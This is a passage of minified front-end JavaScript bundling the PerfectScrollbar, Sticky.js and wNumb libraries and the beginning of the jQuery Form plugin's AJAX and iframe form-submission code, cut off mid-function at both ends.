t.settings.minScrollbarLength)), t.settings.maxScrollbarLength && (e = Math.min(e, t.settings.maxScrollbarLength)), e } function l(e, t) { var n = t[0], i = t[1], o = t[2], a = t[3], s = t[4], r = t[5], g = t[6], l = t[7], c = t[8], I = e.element, u = null, h = null, d = null; function C(t) { I[g] = u + d * (t[o] - h), f(e, l), B(e), t.stopPropagation(), t.preventDefault() } function A() { b(e, l), e[c].classList.remove(m.state.clicking), e.event.unbind(e.ownerDocument, "mousemove", C) } e.event.bind(e[s], "mousedown", function (t) { u = I[g], h = t[o], d = (e[i] - e[n]) / (e[a] - e[r]), e.event.bind(e.ownerDocument, "mousemove", C), e.event.once(e.ownerDocument, "mouseup", A), e[c].classList.add(m.state.clicking), t.stopPropagation(), t.preventDefault() }) } function c(t, e) { var n, i, o = this; if (void 0 === e && (e = {}), "string" == typeof t && (t = document.querySelector(t)), !t || !t.nodeName) throw new Error("no element is specified to initialize PerfectScrollbar"); for (var a in (this.element = t).classList.add(m.main), this.settings = { handlers: ["click-rail", "drag-thumb", "keyboard", "wheel", "touch"], maxScrollbarLength: null, minScrollbarLength: null, scrollingThreshold: 1e3, scrollXMarginOffset: 0, scrollYMarginOffset: 0, suppressScrollX: !1, suppressScrollY: !1, swipeEasing: !0, useBothWheelAxes: !1, wheelPropagation: !0, wheelSpeed: 1 }, e) o.settings[a] = e[a]; function s() { return t.classList.add(m.state.focus) } function r() { return t.classList.remove(m.state.focus) } this.containerWidth = null, this.containerHeight = null, this.contentWidth = null, this.contentHeight = null, this.isRtl = "rtl" === p(t).direction, this.isNegativeScroll = (i = t.scrollLeft, t.scrollLeft = -1, n = t.scrollLeft < 0, t.scrollLeft = i, n), this.negativeScrollAdjustment = this.isNegativeScroll ? t.scrollWidth - t.clientWidth : 0, this.event = new d, this.ownerDocument = t.ownerDocument || document, this.scrollbarXRail = h(m.element.rail("x")), t.appendChild(this.scrollbarXRail), this.scrollbarX = h(m.element.thumb("x")), this.scrollbarXRail.appendChild(this.scrollbarX), this.scrollbarX.setAttribute("tabindex", 0), this.event.bind(this.scrollbarX, "focus", s), this.event.bind(this.scrollbarX, "blur", r), this.scrollbarXActive = null, this.scrollbarXWidth = null, this.scrollbarXLeft = null; var g = p(this.scrollbarXRail); this.scrollbarXBottom = parseInt(g.bottom, 10), isNaN(this.scrollbarXBottom) ? (this.isScrollbarXUsingBottom = !1, this.scrollbarXTop = A(g.top)) : this.isScrollbarXUsingBottom = !0, this.railBorderXWidth = A(g.borderLeftWidth) + A(g.borderRightWidth), u(this.scrollbarXRail, { display: "block" }), this.railXMarginWidth = A(g.marginLeft) + A(g.marginRight), u(this.scrollbarXRail, { display: "" }), this.railXWidth = null, this.railXRatio = null, this.scrollbarYRail = h(m.element.rail("y")), t.appendChild(this.scrollbarYRail), this.scrollbarY = h(m.element.thumb("y")), this.scrollbarYRail.appendChild(this.scrollbarY), this.scrollbarY.setAttribute("tabindex", 0), this.event.bind(this.scrollbarY, "focus", s), this.event.bind(this.scrollbarY, "blur", r), this.scrollbarYActive = null, this.scrollbarYHeight = null, this.scrollbarYTop = null; var l, c, I = p(this.scrollbarYRail); this.scrollbarYRight = parseInt(I.right, 10), isNaN(this.scrollbarYRight) ? (this.isScrollbarYUsingRight = !1, this.scrollbarYLeft = A(I.left)) : this.isScrollbarYUsingRight = !0, this.scrollbarYOuterWidth = this.isRtl ? (l = this.scrollbarY, A((c = p(l)).width) + A(c.paddingLeft) + A(c.paddingRight) + A(c.borderLeftWidth) + A(c.borderRightWidth)) : null, this.railBorderYWidth = A(I.borderTopWidth) + A(I.borderBottomWidth), u(this.scrollbarYRail, { display: "block" }), this.railYMarginHeight = A(I.marginTop) + A(I.marginBottom), u(this.scrollbarYRail, { display: "" }), this.railYHeight = null, this.railYRatio = null, this.reach = { x: t.scrollLeft <= 0 ? "start" : t.scrollLeft >= this.contentWidth - this.containerWidth ? "end" : null, y: t.scrollTop <= 0 ? "start" : t.scrollTop >= this.contentHeight - this.containerHeight ? "end" : null }, this.isAlive = !0, this.settings.handlers.forEach(function (t) { return v[t](o) }), this.lastScrollTop = Math.floor(t.scrollTop), this.lastScrollLeft = t.scrollLeft, this.event.bind(this.element, "scroll", function (t) { return o.onScroll(t) }), B(this) } var v = { "click-rail": function (n) { n.event.bind(n.scrollbarY, "mousedown", function (t) { return t.stopPropagation() }), n.event.bind(n.scrollbarYRail, "mousedown", function (t) { var e = t.pageY - window.pageYOffset - n.scrollbarYRail.getBoundingClientRect().top > n.scrollbarYTop ? 1 : -1; n.element.scrollTop += e * n.containerHeight, B(n), t.stopPropagation() }), n.event.bind(n.scrollbarX, "mousedown", function (t) { return t.stopPropagation() }), n.event.bind(n.scrollbarXRail, "mousedown", function (t) { var e = t.pageX - window.pageXOffset - n.scrollbarXRail.getBoundingClientRect().left > n.scrollbarXLeft ? 1 : -1; n.element.scrollLeft += e * n.containerWidth, B(n), t.stopPropagation() }) }, "drag-thumb": function (t) { l(t, ["containerWidth", "contentWidth", "pageX", "railXWidth", "scrollbarX", "scrollbarXWidth", "scrollLeft", "x", "scrollbarXRail"]), l(t, ["containerHeight", "contentHeight", "pageY", "railYHeight", "scrollbarY", "scrollbarYHeight", "scrollTop", "y", "scrollbarYRail"]) }, keyboard: function (a) { var s = a.element; a.event.bind(a.ownerDocument, "keydown", function (t) { if (!(t.isDefaultPrevented && t.isDefaultPrevented() || t.defaultPrevented) && (r(s, ":hover") || r(a.scrollbarX, ":focus") || r(a.scrollbarY, ":focus"))) { var e, n = document.activeElement ? document.activeElement : a.ownerDocument.activeElement; if (n) { if ("IFRAME" === n.tagName) n = n.contentDocument.activeElement; else for (; n.shadowRoot;)n = n.shadowRoot.activeElement; if (r(e = n, "input,[contenteditable]") || r(e, "select,[contenteditable]") || r(e, "textarea,[contenteditable]") || r(e, "button,[contenteditable]")) return } var i = 0, o = 0; switch (t.which) { case 37: i = t.metaKey ? -a.contentWidth : t.altKey ? -a.containerWidth : -30; break; case 38: o = t.metaKey ? a.contentHeight : t.altKey ? a.containerHeight : 30; break; case 39: i = t.metaKey ? a.contentWidth : t.altKey ? a.containerWidth : 30; break; case 40: o = t.metaKey ? -a.contentHeight : t.altKey ? -a.containerHeight : -30; break; case 32: o = t.shiftKey ? a.containerHeight : -a.containerHeight; break; case 33: o = a.containerHeight; break; case 34: o = -a.containerHeight; break; case 36: o = a.contentHeight; break; case 35: o = -a.contentHeight; break; default: return }a.settings.suppressScrollX && 0 !== i || a.settings.suppressScrollY && 0 !== o || (s.scrollTop -= o, s.scrollLeft += i, B(a), function (t, e) { var n = Math.floor(s.scrollTop); if (0 === t) { if (!a.scrollbarYActive) return; if (0 === n && 0 < e || n >= a.contentHeight - a.containerHeight && e < 0) return !a.settings.wheelPropagation } var i = s.scrollLeft; if (0 === e) { if (!a.scrollbarXActive) return; if (0 === i && t < 0 || i >= a.contentWidth - a.containerWidth && 0 < t) return !a.settings.wheelPropagation } return 1 }(i, o) && t.preventDefault()) } }) }, wheel: function (C) { var A = C.element; function t(t) { var e, n, i, o, a, s, r, g, l, c, I, u = (n = (e = t).deltaX, i = -1 * e.deltaY, void 0 !== n && void 0 !== i || (n = -1 * e.wheelDeltaX / 6, i = e.wheelDeltaY / 6), e.deltaMode && 1 === e.deltaMode && (n *= 10, i *= 10), n != n && i != i && (n = 0, i = e.wheelDelta), e.shiftKey ? [-i, -n] : [n, i]), h = u[0], d = u[1]; !function (t, e, n) { if (!y.isWebKit && A.querySelector("select:focus")) return 1; if (A.contains(t)) for (var i = t; i && i !== A;) { if (i.classList.contains(m.element.consuming)) return 1; var o = p(i); if ([o.overflow, o.overflowX, o.overflowY].join("").match(/(scroll|auto)/)) { var a = i.scrollHeight - i.clientHeight; if (0 < a && !(0 === i.scrollTop && 0 < n || i.scrollTop === a && n < 0)) return 1; var s = i.scrollWidth - i.clientWidth; if (0 < s && !(0 === i.scrollLeft && e < 0 || i.scrollLeft === s && 0 < e)) return 1 } i = i.parentNode } }(t.target, h, d) && (o = !1, C.settings.useBothWheelAxes ? C.scrollbarYActive && !C.scrollbarXActive ? (d ? A.scrollTop -= d * C.settings.wheelSpeed : A.scrollTop += h * C.settings.wheelSpeed, o = !0) : C.scrollbarXActive && !C.scrollbarYActive && (h ? A.scrollLeft += h * C.settings.wheelSpeed : A.scrollLeft -= d * C.settings.wheelSpeed, o = !0) : (A.scrollTop -= d * C.settings.wheelSpeed, A.scrollLeft += h * C.settings.wheelSpeed), B(C), (o = o || (a = h, s = d, r = Math.floor(A.scrollTop), g = 0 === A.scrollTop, l = r + A.offsetHeight === A.scrollHeight, c = 0 === A.scrollLeft, I = A.scrollLeft + A.offsetWidth === A.scrollWidth, !(Math.abs(s) > Math.abs(a) ? g || l : c || I) || !C.settings.wheelPropagation)) && !t.ctrlKey && (t.stopPropagation(), t.preventDefault())) } void 0 !== window.onwheel ? C.event.bind(A, "wheel", t) : void 0 !== window.onmousewheel && C.event.bind(A, "mousewheel", t) }, touch: function (r) { var g, l, c, I, n; function u(t, e) { g.scrollTop -= e, g.scrollLeft -= t, B(r) } function h(t) { return t.targetTouches ? t.targetTouches[0] : t } function d(t) { return (!t.pointerType || "pen" !== t.pointerType || 0 !== t.buttons) && (t.targetTouches && 1 === t.targetTouches.length || !(!t.pointerType || "mouse" === t.pointerType || t.pointerType === t.MSPOINTER_TYPE_MOUSE)) } function t(t) { var e; d(t) && (e = h(t), l.pageX = e.pageX, l.pageY = e.pageY, c = (new Date).getTime(), null !== n && clearInterval(n)) } function e(t) { if (d(t)) { var e = h(t), n = { pageX: e.pageX, pageY: e.pageY }, i = n.pageX - l.pageX, o = n.pageY - l.pageY; if (function (t, e, n) { if (g.contains(t)) for (var i = t; i && i !== g;) { if (i.classList.contains(m.element.consuming)) return 1; var o = p(i); if ([o.overflow, o.overflowX, o.overflowY].join("").match(/(scroll|auto)/)) { var a = i.scrollHeight - i.clientHeight; if (0 < a && !(0 === i.scrollTop && 0 < n || i.scrollTop === a && n < 0)) return 1; var s = i.scrollLeft - i.clientWidth; if (0 < s && !(0 === i.scrollLeft && e < 0 || i.scrollLeft === s && 0 < e)) return 1 } i = i.parentNode } }(t.target, i, o)) return; u(i, o), l = n; var a = (new Date).getTime(), s = a - c; 0 < s && (I.x = i / s, I.y = o / s, c = a), function (t, e) { var n = Math.floor(g.scrollTop), i = g.scrollLeft, o = Math.abs(t), a = Math.abs(e); if (o < a) { if (e < 0 && n === r.contentHeight - r.containerHeight || 0 < e && 0 === n) return 0 === window.scrollY && 0 < e && y.isChrome } else if (a < o && (t < 0 && i === r.contentWidth - r.containerWidth || 0 < t && 0 === i)) return 1; return 1 }(i, o) && t.preventDefault() } } function i() { r.settings.swipeEasing && (clearInterval(n), n = setInterval(function () { r.isInitialized || !I.x && !I.y || Math.abs(I.x) < .01 && Math.abs(I.y) < .01 ? clearInterval(n) : (u(30 * I.x, 30 * I.y), I.x *= .8, I.y *= .8) }, 10)) } (y.supportsTouch || y.supportsIePointer) && (g = r.element, l = {}, c = 0, I = {}, n = null, y.supportsTouch ? (r.event.bind(g, "touchstart", t), r.event.bind(g, "touchmove", e), r.event.bind(g, "touchend", i)) : y.supportsIePointer && (window.PointerEvent ? (r.event.bind(g, "pointerdown", t), r.event.bind(g, "pointermove", e), r.event.bind(g, "pointerup", i)) : window.MSPointerEvent && (r.event.bind(g, "MSPointerDown", t), r.event.bind(g, "MSPointerMove", e), r.event.bind(g, "MSPointerUp", i)))) } }; return c.prototype.update = function () { this.isAlive && (this.negativeScrollAdjustment = this.isNegativeScroll ? this.element.scrollWidth - this.element.clientWidth : 0, u(this.scrollbarXRail, { display: "block" }), u(this.scrollbarYRail, { display: "block" }), this.railXMarginWidth = A(p(this.scrollbarXRail).marginLeft) + A(p(this.scrollbarXRail).marginRight), this.railYMarginHeight = A(p(this.scrollbarYRail).marginTop) + A(p(this.scrollbarYRail).marginBottom), u(this.scrollbarXRail, { display: "none" }), u(this.scrollbarYRail, { display: "none" }), B(this), e(this, "top", 0, !1, !0), e(this, "left", 0, !1, !0), u(this.scrollbarXRail, { display: "" }), u(this.scrollbarYRail, { display: "" })) }, c.prototype.onScroll = function () { this.isAlive && (B(this), e(this, "top", this.element.scrollTop - this.lastScrollTop), e(this, "left", this.element.scrollLeft - this.lastScrollLeft), this.lastScrollTop = Math.floor(this.element.scrollTop), this.lastScrollLeft = this.element.scrollLeft) }, c.prototype.destroy = function () { this.isAlive && (this.event.unbindAll(), i(this.scrollbarX), i(this.scrollbarY), i(this.scrollbarXRail), i(this.scrollbarYRail), this.removePsClasses(), this.element = null, this.scrollbarX = null, this.scrollbarY = null, this.scrollbarXRail = null, this.scrollbarYRail = null, this.isAlive = !1) }, c.prototype.removePsClasses = function () { this.element.className = this.element.className.split(" ").filter(function (t) { return !t.match(/^ps([-_].+|)$/) }).join(" ") }, c }); var Sticky = function () { function n() { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : "", e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}; _classCallCheck(this, n), this.selector = t, this.elements = [], this.version = "1.2.0", this.vp = this.getViewportSize(), this.body = document.querySelector("body"), this.options = { wrap: e.wrap || !1, marginTop: e.marginTop || 0, stickyFor: e.stickyFor || 0, stickyClass: e.stickyClass || null, stickyContainer: e.stickyContainer || "body" }, this.updateScrollTopPosition = this.updateScrollTopPosition.bind(this), this.updateScrollTopPosition(), window.addEventListener("load", this.updateScrollTopPosition), window.addEventListener("scroll", this.updateScrollTopPosition), this.run() } return n.prototype.run = function () { var e = this, n = setInterval(function () { var t; "complete" === document.readyState && (clearInterval(n), t = document.querySelectorAll(e.selector), e.forEach(t, function (t) { return e.renderElement(t) })) }, 10) }, n.prototype.renderElement = function (t) { var e = this; t.sticky = {}, t.sticky.active = !1, t.sticky.marginTop = parseInt(t.getAttribute("data-margin-top")) || this.options.marginTop, t.sticky.stickyFor = parseInt(t.getAttribute("data-sticky-for")) || this.options.stickyFor, t.sticky.stickyClass = t.getAttribute("data-sticky-class") || this.options.stickyClass, t.sticky.wrap = !!t.hasAttribute("data-sticky-wrap") || this.options.wrap, t.sticky.stickyContainer = this.options.stickyContainer, t.sticky.container = this.getStickyContainer(t), t.sticky.container.rect = this.getRectangle(t.sticky.container), t.sticky.rect = this.getRectangle(t), "img" === t.tagName.toLowerCase() && (t.onload = function () { return t.sticky.rect = e.getRectangle(t) }), t.sticky.wrap && this.wrapElement(t), this.activate(t) }, n.prototype.wrapElement = function (t) { t.insertAdjacentHTML("beforebegin", "<span></span>"), t.previousSibling.appendChild(t) }, n.prototype.activate = function (t) { t.sticky.rect.top + t.sticky.rect.height < t.sticky.container.rect.top + t.sticky.container.rect.height && t.sticky.stickyFor < this.vp.width && !t.sticky.active && (t.sticky.active = !0), this.elements.indexOf(t) < 0 && this.elements.push(t), t.sticky.resizeEvent || (this.initResizeEvents(t), t.sticky.resizeEvent = !0), t.sticky.scrollEvent || (this.initScrollEvents(t), t.sticky.scrollEvent = !0), this.setPosition(t) }, n.prototype.initResizeEvents = function (t) { var e = this; t.sticky.resizeListener = function () { return e.onResizeEvents(t) }, window.addEventListener("resize", t.sticky.resizeListener) }, n.prototype.destroyResizeEvents = function (t) { window.removeEventListener("resize", t.sticky.resizeListener) }, n.prototype.onResizeEvents = function (t) { this.vp = this.getViewportSize(), t.sticky.rect = this.getRectangle(t), t.sticky.container.rect = this.getRectangle(t.sticky.container), t.sticky.rect.top + t.sticky.rect.height < t.sticky.container.rect.top + t.sticky.container.rect.height && t.sticky.stickyFor < this.vp.width && !t.sticky.active ? t.sticky.active = !0 : (t.sticky.rect.top + t.sticky.rect.height >= t.sticky.container.rect.top + t.sticky.container.rect.height || t.sticky.stickyFor >= this.vp.width && t.sticky.active) && (t.sticky.active = !1), this.setPosition(t) }, n.prototype.initScrollEvents = function (t) { var e = this; t.sticky.scrollListener = function () { return e.onScrollEvents(t) }, window.addEventListener("scroll", t.sticky.scrollListener) }, n.prototype.destroyScrollEvents = function (t) { window.removeEventListener("scroll", t.sticky.scrollListener) }, n.prototype.onScrollEvents = function (t) { t.sticky.active && this.setPosition(t) }, n.prototype.setPosition = function (t) { this.css(t, { position: "", width: "", top: "", left: "" }), this.vp.height < t.sticky.rect.height || !t.sticky.active || (t.sticky.rect.width || (t.sticky.rect = this.getRectangle(t)), t.sticky.wrap && this.css(t.parentNode, { display: "block", width: t.sticky.rect.width + "px", height: t.sticky.rect.height + "px" }), 0 === t.sticky.rect.top && t.sticky.container === this.body ? this.css(t, { position: "fixed", top: t.sticky.rect.top + "px", left: t.sticky.rect.left + "px", width: t.sticky.rect.width + "px" }) : this.scrollTop > t.sticky.rect.top - t.sticky.marginTop ? (this.css(t, { position: "fixed", width: t.sticky.rect.width + "px", left: t.sticky.rect.left + "px" }), this.scrollTop + t.sticky.rect.height + t.sticky.marginTop > t.sticky.container.rect.top + t.sticky.container.offsetHeight ? (t.sticky.stickyClass && t.classList.remove(t.sticky.stickyClass), this.css(t, { top: t.sticky.container.rect.top + t.sticky.container.offsetHeight - (this.scrollTop + t.sticky.rect.height) + "px" })) : (t.sticky.stickyClass && t.classList.add(t.sticky.stickyClass), this.css(t, { top: t.sticky.marginTop + "px" }))) : (t.sticky.stickyClass && t.classList.remove(t.sticky.stickyClass), this.css(t, { position: "", width: "", top: "", left: "" }), t.sticky.wrap && this.css(t.parentNode, { display: "", width: "", height: "" }))) }, n.prototype.update = function () { var e = this; this.forEach(this.elements, function (t) { t.sticky.rect = e.getRectangle(t), t.sticky.container.rect = e.getRectangle(t.sticky.container), e.activate(t), e.setPosition(t) }) }, n.prototype.destroy = function () { var e = this; this.forEach(this.elements, function (t) { e.destroyResizeEvents(t), e.destroyScrollEvents(t), delete t.sticky }) }, n.prototype.getStickyContainer = function (t) { for (var e = t.parentNode; !e.hasAttribute("data-sticky-container") && !e.parentNode.querySelector(t.sticky.stickyContainer) && e !== this.body;)e = e.parentNode; return e }, n.prototype.getRectangle = function (t) { this.css(t, { position: "", width: "", top: "", left: "" }); for (var e = Math.max(t.offsetWidth, t.clientWidth, t.scrollWidth), n = Math.max(t.offsetHeight, t.clientHeight, t.scrollHeight), i = 0, o = 0; i += t.offsetTop || 0, o += t.offsetLeft || 0, t = t.offsetParent;); return { top: i, left: o, width: e, height: n } }, n.prototype.getViewportSize = function () { return { width: Math.max(document.documentElement.clientWidth, window.innerWidth || 0), height: Math.max(document.documentElement.clientHeight, window.innerHeight || 0) } }, n.prototype.updateScrollTopPosition = function () { this.scrollTop = (window.pageYOffset || document.scrollTop) - (document.clientTop || 0) || 0 }, n.prototype.forEach = function (t, e) { for (var n = 0, i = t.length; n < i; n++)e(t[n]) }, n.prototype.css = function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t.style[n] = e[n]) }, n }(); !function (t, e) { "undefined" != typeof exports ? module.exports = e : "function" == typeof define && define.amd ? define([], e) : t.Sticky = e }(this, Sticky), function (t) { "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? module.exports = t() : window.wNumb = t() }(function () { "use strict"; var a = ["decimals", "thousand", "mark", "prefix", "suffix", "encoder", "decoder", "negativeBefore", "negative", "edit", "undo"]; function b(t) { return t.split("").reverse().join("") } function C(t, e) { return t.substring(0, e.length) === e } function s(t, e, n) { if ((t[e] || t[n]) && t[e] === t[n]) throw new Error(e) } function B(t) { return "number" == typeof t && isFinite(t) } function n(t, e, n, i, o, a, s, r, g, l, c, I) { var u, h, d, C, A, p = I, m = "", f = ""; return a && (I = a(I)), !!B(I) && (!1 !== t && 0 === parseFloat(I.toFixed(t)) && (I = 0), I < 0 && (u = !0, I = Math.abs(I)), !1 !== t && (A = t, C = (C = I).toString().split("e"), I = (+((C = (C = Math.round(+(C[0] + "e" + (C[1] ? +C[1] + A : A)))).toString().split("e"))[0] + "e" + (C[1] ? C[1] - A : -A))).toFixed(A)), -1 !== (I = I.toString()).indexOf(".") ? (d = (h = I.split("."))[0], n && (m = n + h[1])) : d = I, e && (d = b(d).match(/.{1,3}/g), d = b(d.join(b(e)))), u && r && (f += r), i && (f += i), u && g && (f += g), f += d, f += m, o && (f += o), l && (f = l(f, p)), f) } function i(t, e, n, i, o, a, s, r, g, l, c, I) { var u, h, d = ""; return c && (I = c(I)), !(!I || "string" != typeof I) && (r && C(I, r) && (I = I.replace(r, ""), u = !0), i && C(I, i) && (I = I.replace(i, "")), g && C(I, g) && (I = I.replace(g, ""), u = !0), o && (h = o, I.slice(-1 * h.length) === h) && (I = I.slice(0, -1 * o.length)), e && (I = I.split(e).join("")), n && (I = I.replace(n, ".")), u && (d += "-"), "" !== (d = (d += I).replace(/[^0-9\.\-.]/g, "")) && (d = Number(d), s && (d = s(d)), !!B(d) && d)) } function o(t, e, n) { for (var i = [], o = 0; o < a.length; o += 1)i.push(t[a[o]]); return i.push(n), e.apply("", i) } return function t(e) { if (!(this instanceof t)) return new t(e); "object" == typeof e && (e = function (t) { var e, n, i, o = {}; for (void 0 === t.suffix && (t.suffix = t.postfix), e = 0; e < a.length; e += 1)if (void 0 === (i = t[n = a[e]])) "negative" !== n || o.negativeBefore ? "mark" === n && "." !== o.thousand ? o[n] = "." : o[n] = !1 : o[n] = "-"; else if ("decimals" === n) { if (!(0 <= i && i < 8)) throw new Error(n); o[n] = i } else if ("encoder" === n || "decoder" === n || "edit" === n || "undo" === n) { if ("function" != typeof i) throw new Error(n); o[n] = i } else { if ("string" != typeof i) throw new Error(n); o[n] = i } return s(o, "mark", "thousand"), s(o, "prefix", "negative"), s(o, "prefix", "negativeBefore"), o }(e), this.to = function (t) { return o(e, n, t) }, this.from = function (t) { return o(e, i, t) }) } }), function (n) { "function" == typeof define && define.amd ? define(["jquery"], n) : "object" == typeof module && module.exports ? module.exports = function (t, e) { return void 0 === e && (e = "undefined" != typeof window ? require("jquery") : require("jquery")(t)), n(e), e } : n(jQuery) }(function (W) { "use strict"; function a(t) { var e = t.data; t.isDefaultPrevented() || (t.preventDefault(), W(t.target).closest("form").ajaxSubmit(e)) } function s(t) { var e = t.target, n = W(e); if (!n.is("[type=submit],[type=image]")) { var i = n.closest("[type=submit]"); if (0 === i.length) return; e = i[0] } var o, a = e.form; "image" === (a.clk = e).type && (void 0 !== t.offsetX ? (a.clk_x = t.offsetX, a.clk_y = t.offsetY) : "function" == typeof W.fn.offset ? (o = n.offset(), a.clk_x = t.pageX - o.left, a.clk_y = t.pageY - o.top) : (a.clk_x = t.pageX - e.offsetLeft, a.clk_y = t.pageY - e.offsetTop)), setTimeout(function () { a.clk = a.clk_x = a.clk_y = null }, 100) } function N() { var t; W.fn.ajaxSubmit.debug && (t = "[jquery.form] " + Array.prototype.join.call(arguments, ""), window.console && window.console.log ? window.console.log(t) : window.opera && window.opera.postError && window.opera.postError(t)) } var h = /\r?\n/g, v = {}; v.fileapi = void 0 !== W('<input type="file">').get(0).files, v.formdata = void 0 !== window.FormData; var T = !!W.fn.prop; W.fn.attr2 = function () { if (!T) return this.attr.apply(this, arguments); var t = this.prop.apply(this, arguments); return t && t.jquery || "string" == typeof t ? t : this.attr.apply(this, arguments) }, W.fn.ajaxSubmit = function (k, t, e, n) { function i(t) { function c(e) { var n = null; try { e.contentWindow && (n = e.contentWindow.document) } catch (e) { N("cannot get iframe.contentWindow document: " + e) } if (n) return n; try { n = e.contentDocument ? e.contentDocument : e.document } catch (t) { N("cannot get iframe.contentDocument: " + t), n = e.document } return n } function e() { var t = Z.attr2("target"), e = Z.attr2("action"), n = Z.attr("enctype") || Z.attr("encoding") || "multipart/form-data"; r.setAttribute("target", a), D && !/post/i.test(D) || r.setAttribute("method", "POST"), e !== u.url && r.setAttribute("action", u.url), u.skipEncodingOverride || D && !/post/i.test(D) || Z.attr({ encoding: "multipart/form-data", enctype: "multipart/form-data" }), u.timeout && (m = setTimeout(function () { p = !0, I(b) }, u.timeout)); var i = []; try { if (u.extraData) for (var o in u.extraData) u.extraData.hasOwnProperty(o) && (W.isPlainObject(u.extraData[o]) && u.extraData[o].hasOwnProperty("name") && u.extraData[o].hasOwnProperty("value") ? i.push(W('<input type="hidden" name="' + u.extraData[o].name + '">', g).val(u.extraData[o].value).appendTo(r)[0]) : i.push(W('<input type="hidden" name="' + o + '">', g).val(u.extraData[o]).appendTo(r)[0])); u.iframeTarget || d.appendTo(l), C.attachEvent ? C.attachEvent("onload", I) : C.addEventListener("load", I, !1), setTimeout(function t() { try { var e = c(C).readyState; N("state = " + e), e && "uninitialized" === e.toLowerCase() && setTimeout(t, 50) } catch (e) { N("Server abort: ", e, " (", e.name, ")"), I(B), m && clearTimeout(m), m = void 0 } }, 15); try { r.submit() } catch (t) { document.createElement("form").submit.apply(r) } } finally { r.setAttribute("action", e), r.setAttribute("enctype", n), t ? r.setAttribute("target", t) : Z.removeAttr("target"), W(i).remove() } } function I(t) { if (!A.aborted && !Q) { if ((F = c(C)) || (N("cannot access response document"), t = B), t === b && A) return A.abort("timeout"), void f.reject(A, "timeout"); if (t === B && A) return A.abort("server abort"), void f.reject(A, "error", "server abort"); if (F && F.location.href !== u.iframeSrc || p) { C.detachEvent ? C.detachEvent("onload", I) : C.removeEventListener("load", I, !1); var e, n = "success"; try { if (p) throw "timeout"; var i = "xml" === u.dataType || F.XMLDocument || W.isXMLDoc(F); if (N("isXml=" + i), !i && window.opera && (null === F.body || !F.body.innerHTML) && --G) return N("requeing onLoad callback, DOM not available"), void setTimeout(I, 250); var o = F.body ? F.body : F.documentElement; A.responseText = o ? o.innerHTML : null, A.responseXML = F.XMLDocument ? F.XMLDocument : F, i && (u.dataType = "xml"), A.getResponseHeader = function (t) { return { "content-type": u.dataType }[t.toLowerCase()] }, o && (A.status = Number(o.getAttribute("status")) || A.status, A.statusText = o.getAttribute("statusText") || A.statusText); var a, s, r, g = (u.dataType || "").toLowerCase(), l = /(json|script|text)/.test(g); l || u.textarea ? (a = F.getElementsByTagName("textarea")[0]) ? (A.responseText = a.value, A.status = Number(a.getAttribute("status")) || A.status, A.statusText = a.getAttribute("statusText") || A.statusText) : l && (s = F.getElementsByTagName("pre")[0], r = F.getElementsByTagName("body")[0], s ? A.responseText = s.textContent ? s.textContent : s.innerText : r && (A.responseText = r.textContent ? r.textContent : r.innerText)) : "xml" === g && !A.responseXML && A.responseText && (A.responseXML = w(A.responseText)); try { x = S(A, g, u) } catch (t) { n = "parsererror", A.error = e = t || n } } catch (t) { N("error caught: ", t), n = "error", A.error = e = t || n } A.aborted && (N("upload aborted"), n = null), A.status && (n = 200 <= A.status && A.status < 300 || 304 === A.status ? "success" : "error"), "success" === n ? (u.success && u.success.call(u.context, x, "success", A), f.resolve(A.responseText, "success", A), h && W.event.trigger("ajaxSuccess", [A, u])) : n && (void 0 === e && (e = A.statusText), u.error && u.error.call(u.context, A, n, e), f.reject(A, "error", e), h && W.event.trigger("ajaxError", [A, u, e])), h && W.event.trigger("ajaxComplete", [A, u]), h && !--W.active && W.event.trigger("ajaxStop"), u.complete && u.complete.call(u.context, A, n), Q = !0, u.timeout && clearTimeout(m), setTimeout(function () { u.iframeTarget ? d.attr("src", u.iframeSrc) : d.remove(), A.responseXML = null }, 100) } } } var n, i, u, h, a, d, C, A, o, s, p, m, r = Z[0], f = W.Deferred(); if (f.abort = function (t) { A.abort(t) }, t) for (i = 0; i < U.length; i++)n = W(U[i]), T ? n.prop("disabled", !1) : n.removeAttr("disabled"); (u = W.extend(!0, {}, W.ajaxSettings, k)).context = u.context || u, a = "jqFormIO" + (new Date).getTime(); var g = r.ownerDocument, l = Z.closest("body"); if (u.iframeTarget ? (s = (d = W(u.iframeTarget, g)).attr2("name")) ? a = s : d.attr2("name", a) : (d = W('<iframe name="' + a + '" src="' + u.iframeSrc + '" />', g)).css({ position: "absolute", top: "-1000px", left: "-1000px" }), C = d[0], A = { aborted: 0, responseText: null, responseXML: null, status: 0, statusText: "n/a", getAllResponseHeaders: function () { }, getResponseHeader: function () { }, setRequestHeader: function () { }, abort: function (t) { var e = "timeout" === t ? "timeout" : "aborted"; N("aborting upload... " + e), this.aborted = 1; try { C.contentWindow.document.execCommand && C.contentWindow.document.execCommand("Stop") } catch (t) { } d.attr("src", u.iframeSrc), A.error = e, u.error && u.error.call(u.context, A, e, t), h && W.event.trigger("ajaxError", [A, u, e]), u.complete && u.complete.call(u.context, A, e) } }, (h = u.global) && 0 == W.active++ && W.event.trigger("ajaxStart"), h && W.event.trigger("ajaxSend", [A, u]), u.beforeSend && !1 === u.beforeSend.call(u.context, A, u)) return u.global && W.active--, f.reject(), f; if (A.aborted) return f.reject(), f; (o = r.clk) && (s = o.name) && !o.disabled && (u.extraData = u.extraData || {}, u.extraData[s] = o.value, "image" === o.type && (u.extraData[s + ".x"] = r.clk_x, u.extraData[s + ".y"] = r.clk_y)); var b = 1, B = 2, y = W("meta[name=csrf-token]").attr("content"), v = W("meta[name=csrf-param]").attr("content"); v && y && (u.extraData = u.extraData || {}, u.extraData[v] = y), u.forceSync ? e() : setTimeout(e, 10); var x, F, Q, G = 50, w = W.parseXML || function (t, e) { return window.ActiveXObject ? ((e = new ActiveXObject("Microsoft.XMLDOM")).async = "false", e.loadXML(t)) : e = (new DOMParser).parseFromString(t, "text/xml"), e && e.documentElement && "parsererror" !== e.documentElement.nodeName ? e : null }, X = W.parseJSON || function (t) { return window.eval("(" + t + ")") }, S = function (t, e, n) { var i = t.getResponseHeader("content-type") || "", o = ("xml" === e || !e) && 0 <= i.indexOf("xml"), a = o ? t.responseXML : t.responseText; return o && "parsererror" === a.documentElement.nodeName && W.error && W.error("parsererror"), n && n.dataFilter && (a = n.dataFilter(a, e)), "string" == typeof a && (("json" === e || !e) && 0 <= i.indexOf("json") ? a = X(a) : ("script" === e || !e) && 0 <= 